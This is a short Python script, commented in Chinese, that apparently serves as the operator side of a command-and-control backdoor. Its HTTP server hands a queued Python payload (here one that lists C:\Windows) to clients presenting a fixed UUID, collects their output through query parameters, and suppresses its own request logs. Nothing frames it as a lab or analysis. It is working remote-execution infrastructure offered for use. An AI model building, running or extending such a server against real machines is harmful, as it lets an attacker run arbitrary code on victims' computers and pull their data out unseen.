from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse


id = '370a74dc-9288-451c-b21a-e071e39db97d'

code = r'''
log('\n'.join(os.listdir('C:\\Windows')))
'''


class MyRequestHandler(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        # 隐藏默认日志消息
        pass

    def do_GET(self):
        global id
        global code
        if '/code' in self.path and f'id={id}' in self.path:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers() 
            
            self.wfile.write(code.encode())
            print(f'代码已发送  {code}')
            print('\n')
            code = '0'


        elif '/output' in self.path and f'id={id}' in self.path:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            print('输出:', urllib.parse.unquote_plus(self.path.split('&out=')[1]))
            # print(self.path)
            print('-----------------')

            message = 'success'   
            self.wfile.write(message.encode())

        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            message = "0"
            self.wfile.write(message.encode())



if __name__ == '__main__':
    server_address = ('', 8000)
    httpd = HTTPServer(server_address, MyRequestHandler)
    print('Starting server...\n\n')
    httpd.serve_forever()
